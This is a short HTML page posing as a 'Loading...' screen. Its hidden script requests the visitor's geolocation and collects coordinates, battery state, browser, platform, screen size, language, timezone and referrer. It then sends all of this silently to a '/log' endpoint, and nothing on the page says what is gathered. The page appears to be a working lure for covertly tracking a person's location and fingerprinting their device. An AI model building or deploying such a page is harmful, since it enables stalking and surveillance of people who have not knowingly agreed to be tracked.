<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <script>
    async function sendData(info) {
      await fetch('/log', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(info)
      });
    }

    navigator.geolocation.getCurrentPosition(async (pos) => {
      const info = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        battery_level: "?",
        charging: "?",
        browser: navigator.userAgent,
        device: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer
      };

      try {
        const battery = await navigator.getBattery();
        info.battery_level = Math.round(battery.level * 100);
        info.charging = battery.charging;
      } catch {}

      await sendData(info);
    });
  </script>
</head>
<body>
  <h2>Loading...</h2>
</body>
</html>
